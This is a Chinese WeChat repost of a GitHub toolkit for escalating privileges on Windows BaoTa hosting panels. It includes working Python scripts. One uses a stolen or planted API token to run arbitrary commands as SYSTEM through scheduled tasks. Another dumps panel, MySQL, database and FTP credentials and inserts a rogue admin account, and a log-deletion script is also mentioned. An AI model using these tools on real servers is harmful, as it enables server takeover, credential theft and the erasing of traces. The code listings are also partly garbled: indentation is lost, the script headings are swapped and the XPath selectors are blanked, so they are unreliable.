> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/yYOQTg9j_zKwbJ0WgGwjcg)

本项目整理一些宝塔特性，可以在无漏洞的情况下利用这些特性来增加提权的机会。

**项目地址：**https://github.com/Hzllaga/BT_Panel_Privilege_Escalation

**记得点个 Star！**

**Table of Contents**

*   宝塔面板 Windows 提权方法
    

*   写数据库提权
    
*   API 提权
    
*   计划任务提权
    

*   自动化测试
    

写数据库提权

宝塔面板在 2008 安装的时候默认 www 用户是可以对宝塔面板的数据库有完全控制权限的：

```
powershell -Command "get-acl C:\BtSoft\panel\data\default.db | format-list"
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9V3mQm4R73FtsnuWEBwckvHiciagTCa1nI5ibmjXxeicqxYcHAoVo6Fqy53kNELaSUHkkUcDhrnBp7Fg/640?wx_fmt=png)

对于这种情况可以直接往数据库写一个面板的账号直接获取到面板权限，而在 2016 安装默认是 User 权限可读不可写

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9V3mQm4R73FtsnuWEBwckvdSSxoLEukqzba7AdibicBoX4Vpo28FEV85Mr17hmtB8cEj4iblvBZmqJQ/640?wx_fmt=png)

这种情况可以从里面读取一些敏感信息，比如 mysql 的 root 密码，而一般这个配置的不会只有这个文件可读，可以使用其他方法。

盐： `[A-Za-z0-9]{12}`

密码： `md5(md5(md5(password) + '_bt.cn') + salt)`

可以直接使用`bt_panel_script.py`，脚本会自动新建一个账号。

API 提权

宝塔面板支持 API 操作的，token 在`C:\BtSoft\panel\config\api.json`，用这个方法提权还可以无视入口校验，比如有一个未授权访问的 redis 是 system 权限，就可以直接往这个文件覆盖 token 直接接管面板，或是利用 FileZilla(windows 面板默认 ftp 软件就是 FileZilla + 空密码) 新建一个 C 盘权限的账号，也可以去修改那个文件来提权。

API Token: `md5(string)`

api.json

```
{"open": true, "token": "API Token", "limit_addr": ["你的IP"]}
```

请求时加上 (`multipart/form-data`)：

```
request_token = md5(timestamp + token)
request_time = timestamp
```

```
路径：C:/BtSoft/cron/
```

计划任务提权

基本上场景同 API 提权，可以去修改计划任务文件 (比如网站备份)，默认是在凌晨 1：30 执行，权限也是 system。

```
python3 .\bt_panel_script.py
```

有些面板 API 会无法登陆，就只能利用计划任务来提权了，缺点是路径不固定，且执行时间也不固定。

自动化测试

```
python3 .\bt_panel_api.py -g
```

使用此脚本可以全自动获取宝塔相关信息，python 可以直接用宝塔的，不用担心没环境。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9V3mQm4R73FtsnuWEBwckvMph2ibvDa5iback3gNSYxhfIJGHMpZQv4ZZ5m7flF0Yq3FeviaIvgGKZg/640?wx_fmt=png)

```
python3 .\bt_panel_api.py -u "http://192.168.101.5:8888/" -t "085bd64a698cf601ae472425656b2346" -c whoami
```

这个脚本可以生成 api 示例，把生成的 json 替换到指定文件后就能提权。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9V3mQm4R73FtsnuWEBwckvxm2Baa4RL9YHNrrRIGjbFKuBByqRibI7nb4qgV3iaib8I5xa1hu2sPv8w/640?wx_fmt=png)

```
python3 .\bt_panel_log_delete.py
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9V3mQm4R73FtsnuWEBwckv9ky458KT3KAicFk359WL93ZiajHB9KvaxJ7PxGJUgMyl75MTeOibRkvxA/640?wx_fmt=png)

```
import requests
import argparse
import hashlib
import json
import time
import cowsay


def md5(string):
return hashlib.md5(string.encode()).hexdigest()


def get_random_string(length):
from random import Random
    strings = ''
    chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
    char_len = len(chars) - 1
    random = Random()
for i in range(length):
        strings += chars[random.randint(0, char_len)]
return strings


def get_ip():
return requests.get(url='https://ifconfig.me/ip').text


def generate_example_config():
    token = md5(get_random_string(10))
    payload = {
'open': True,
'token': token,
'limit_addr': [get_ip()]
    }
    print(json.dumps(payload))
    print('请保存在目标C:\\BtSoft\\panel\\config\\api.json')
    print(f"Usage: python bt_panel_api.py -u [URL] -t {token} -c whoami")


def exploit(url, token, cmd):
# api sk
    timestamp = int(time.time())
    token = md5(str(timestamp) + token)
    api_sk = {
'request_token': (None, f'{token}'),
'request_time': (None, f'{timestamp}'),
    }
    crontab_name = get_random_string(10)
# Add a crontab
    payload = {
'sType': (None, 'toShell'),
'name': (None, f'{crontab_name}'),
'type': (None, 'day'),
'hour': (None, '1'),
'minute': (None, '30'),
'sBody': (None, f'{cmd}'),
'sName': (None, ''),
'save': (None, ''),
'backupTo': (None, 'localhost'),
    }
    payload.update(api_sk)
    requests.post(url=f'{url}/crontab?action=AddCrontab', files=payload)

# Get crontab list
    payload = {
'page': (None, '1'),
'search': (None, ''),
    }
    payload.update(api_sk)
    crontab = json.loads(requests.post(url=f'{url}/crontab?action=GetCrontab', files=payload).text)

# Start crontab
    payload = {
# 新添加的会在第一条
'id': (None, f"{crontab[0]['id']}"),
    }
    payload.update(api_sk)
    requests.post(url=f'{url}/crontab?action=StartTask', files=payload)

# Waiting for execution
    time.sleep(3)

# Read the crontab log
    log = json.loads(requests.post(url=f'{url}/crontab?action=GetLogs', files=payload).text)
    print(log['msg'])

# Delete crontab
    requests.post(url=f'{url}/crontab?action=DelCrontab', files=payload)


if __name__ == '__main__':
    cowsay.cow('BaoTa Panel Privilege escalation tool\nAuthor: https://github.com/Hzllaga')
    parser = argparse.ArgumentParser()
    parser.add_argument("-g", "--generate", action="store_true", help='生成一个api示例.')
    parser.add_argument("-u", "--url", help='宝塔地址.')
    parser.add_argument("-t", "--token", help='API token.')
    parser.add_argument("-c", "--command", help='要执行的命令.')
    args = parser.parse_args()
if args.generate:
        generate_example_config()
else:
if (args.url is not None) & (args.token is not None) & (args.command is not None):
            exploit(url=args.url, token=args.token, cmd=args.command)
else:
            print('缺少参数')
```

这个脚本可以自动清理面板日志

脚本源码，也可以在 github 地址下载  

**bt_panel_api.py**
-------------------

```
# -*- coding:utf-8 -*-
import sqlite3


class BT:
def __init__(self):
        self.conn = sqlite3.connect('C:/BtSoft/panel/data/default.db')
        self.c = self.conn.cursor()

    @staticmethod
def read_file(path):
with open(path, 'r') as file:
return file.read()

    @staticmethod
def get_random_string(length):
from random import Random
        strings = ''
        chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
        char_len = len(chars) - 1
        random = Random()
for i in range(length):
            strings += chars[random.randint(0, char_len)]
return strings

    @staticmethod
def md5(string):
import hashlib
return hashlib.md5(string.encode()).hexdigest()

def hash_password(self, password, salt):
return self.md5(self.md5(self.md5(password) + '_bt.cn') + salt)

def get_panel_path(self):
return self.read_file('C:/BtSoft/panel/data/admin_path.pl')

def get_default_username(self):
        cursor = self.c.execute('select username from users where id=1')
return cursor.fetchone()[0]

def get_default_password(self):
return self.read_file('C:/BtSoft/panel/data/default.pl')

def get_all_user(self):
        cursor = self.c.execute('select username, password, salt from users')
return cursor.fetchall()

def get_api_information(self):
import json
        api_data = json.loads(self.read_file('C:/BtSoft/panel/config/api.json'))
if api_data['open']:
            token = api_data['token']
            limit_ip = api_data['limit_addr']
return f'Token：{token}, 限制IP：{limit_ip}'
else:
return '未开启api'

def get_mysql_root_password(self):
        cursor = self.c.execute('select mysql_root from config')
return cursor.fetchone()[0]

def insert_panel_user(self, username, password, salt):
        password = self.hash_password(password, salt)
try:
            sql = f"INSERT INTO users (username,password,salt,email) VALUES ('{username}', '{password}', '{salt}', 'admin@qq.com')"
            self.c.execute(sql)
            self.conn.commit()
return '写入成功！'
except sqlite3.OperationalError:
return '写入失败。'

def get_database_users(self):
        cursor = self.c.execute('select name, username, password, type from databases')
return cursor.fetchall()

def get_ftp_users(self):
        cursor = self.c.execute('select name, password from ftps')
return cursor.fetchall()

def get_filezilla_interface(self):
from xml.etree.ElementTree import fromstring
        ftp_xml = ''
try:
            ftp_xml = self.read_file('C:/BtSoft/ftpServer/FileZilla Server Interface.xml')
            root = fromstring(ftp_xml)
            server = root.findall('./Settings/Item[@]')[0].text
            port = root.findall('./Settings/Item[@]')[0].text
            password = root.findall('./Settings/Item[@]')[0].text
return f'已安装！\n{server}:{port} 密码：{password}'
except FileNotFoundError:
return '未安装Filezilla'


def banner():
    print('''  _____________________________________
/ BaoTa Panel Privilege escalation tool \\
\\ Author: https://github.com/Hzllaga    /
  -------------------------------------
         \\   ^__^ 
          \\  (oo)\\_______
             (__)\\       )\\/\\
                 ||----w |
                 ||     ||
    ''')


if __name__ == '__main__':
    banner()
    bt = BT()
    print('===========================================')
    print(f'登录位置：{bt.get_panel_path()}')
    print(f'默认账号：{bt.get_default_username()}')
    print(f'默认密码：{bt.get_default_password()}')
    print()
    salt = bt.get_random_string(12)
    username = bt.get_random_string(6)
    password = bt.get_random_string(10)
    print(f'尝试写入 账号:{username} 密码：{password} 的面板用户：')
    print(f'{bt.insert_panel_user(username, password, salt)}')
    print('===========================================')
    print('面板用户信息：')
for user in bt.get_all_user():
        print(f'账号：{user[0]}, 密码：{user[1]}, 盐：{user[2]}')
    print('===========================================')
    print('面板API状态：')
    print(f'{bt.get_api_information()}')
    print('如果已开启且限制IP为服务器IP可以端口转发直接秒！')
    print('===========================================')
    print(f'MySQL root密码：{bt.get_mysql_root_password()}')
    print('===========================================')
    print('数据库用户信息：')
for db_user in bt.get_database_users():
        print(f'库名：{db_user[0]}, 用户：{db_user[1]}, 密码：{db_user[2]}, 类型：{db_user[3]}')
    print('===========================================')
    print('FTP用户信息：')
for ftp_user in bt.get_ftp_users():
        print(f'用户：{ftp_user[0]}, 密码：{ftp_user[1]}')
    print('===========================================')
    print('Filezilla Interface配置信息：')
    print(f'{bt.get_filezilla_interface()}')
    print('如果已安装可以通过API或计划任务直接秒！')
    print('===========================================')
```

bt_panel_script.py
------------------

```
# -*- coding:utf-8 -*-
import sqlite3
class BT:
def __init__(self):
        self.conn = sqlite3.connect('C:/BtSoft/panel/data/default.db')
        self.c = self.conn.cursor()
    @staticmethod
def read_file(path):
with open(path, 'r') as file:
return file.read()
    @staticmethod
def get_random_string(length):
from random import Random
        strings = ''
        chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
        char_len = len(chars) - 1
        random = Random()
for i in range(length):
            strings += chars[random.randint(0, char_len)]
return strings
    @staticmethod
def md5(string):
import hashlib
return hashlib.md5(string.encode()).hexdigest()
def hash_password(self, password, salt):
return self.md5(self.md5(self.md5(password) + '_bt.cn') + salt)
def get_panel_path(self):
return self.read_file('C:/BtSoft/panel/data/admin_path.pl')
def get_default_username(self):
        cursor = self.c.execute('select username from users where id=1')
return cursor.fetchone()[0]
def get_default_password(self):
return self.read_file('C:/BtSoft/panel/data/default.pl')
def get_all_user(self):
        cursor = self.c.execute('select username, password, salt from users')
return cursor.fetchall()
def get_api_information(self):
import json
        api_data = json.loads(self.read_file('C:/BtSoft/panel/config/api.json'))
if api_data['open']:
            token = api_data['token']
            limit_ip = api_data['limit_addr']
return f'Token：{token}, 限制IP：{limit_ip}'
else:
return '未开启api'
def get_mysql_root_password(self):
        cursor = self.c.execute('select mysql_root from config')
return cursor.fetchone()[0]
def insert_panel_user(self, username, password, salt):
        password = self.hash_password(password, salt)
try:
            sql = f"INSERT INTO users (username,password,salt,email) VALUES ('{username}', '{password}', '{salt}', 'admin@qq.com')"
            self.c.execute(sql)
            self.conn.commit()
return '写入成功！'
except sqlite3.OperationalError:
return '写入失败。'
def get_database_users(self):
        cursor = self.c.execute('select name, username, password, type from databases')
return cursor.fetchall()
def get_ftp_users(self):
        cursor = self.c.execute('select name, password from ftps')
return cursor.fetchall()
def get_filezilla_interface(self):
from xml.etree.ElementTree import fromstring
        ftp_xml = ''
try:
            ftp_xml = self.read_file('C:/BtSoft/ftpServer/FileZilla Server Interface.xml')
            root = fromstring(ftp_xml)
            server = root.findall('./Settings/Item[@]')[0].text
            port = root.findall('./Settings/Item[@]')[0].text
            password = root.findall('./Settings/Item[@]')[0].text
return f'已安装！\n{server}:{port} 密码：{password}'
except FileNotFoundError:
return '未安装Filezilla'
def banner():
    print('''  _____________________________________
/ BaoTa Panel Privilege escalation tool \\
\\ Author: https://github.com/Hzllaga    /
  -------------------------------------
         \\   ^__^ 
          \\  (oo)\\_______
             (__)\\       )\\/\\
                 ||----w |
                 ||     ||
    ''')
if __name__ == '__main__':
    banner()
    bt = BT()
    print('===========================================')
    print(f'登录位置：{bt.get_panel_path()}')
    print(f'默认账号：{bt.get_default_username()}')
    print(f'默认密码：{bt.get_default_password()}')
    print()
    salt = bt.get_random_string(12)
    username = bt.get_random_string(6)
    password = bt.get_random_string(10)
    print(f'尝试写入 账号:{username} 密码：{password} 的面板用户：')
    print(f'{bt.insert_panel_user(username, password, salt)}')
    print('===========================================')
    print('面板用户信息：')
for user in bt.get_all_user():
        print(f'账号：{user[0]}, 密码：{user[1]}, 盐：{user[2]}')
    print('===========================================')
    print('面板API状态：')
    print(f'{bt.get_api_information()}')
    print('如果已开启且限制IP为服务器IP可以端口转发直接秒！')
    print('===========================================')
    print(f'MySQL root密码：{bt.get_mysql_root_password()}')
    print('===========================================')
    print('数据库用户信息：')
for db_user in bt.get_database_users():
        print(f'库名：{db_user[0]}, 用户：{db_user[1]}, 密码：{db_user[2]}, 类型：{db_user[3]}')
    print('===========================================')
    print('FTP用户信息：')
for ftp_user in bt.get_ftp_users():
        print(f'用户：{ftp_user[0]}, 密码：{ftp_user[1]}')
    print('===========================================')
    print('Filezilla Interface配置信息：')
    print(f'{bt.get_filezilla_interface()}')
    print('如果已安装可以通过API或计划任务直接秒！')
    print('===========================================')
```

来源 Github  

如有侵权，请联系删除

**关注公众号: HACK 之道**  

![](https://mmbiz.qpic.cn/mmbiz_jpg/GzdTGmQpRic3qL1R1NCVbY1ElanNngBlMTUKUibAUoQNQuufs7QibuMXoBHX5ibneNiasMzdthUAficktvRzexoRTXuw/640?wx_fmt=jpeg)

如文章对你有帮助，请支持点下 “赞”“在看”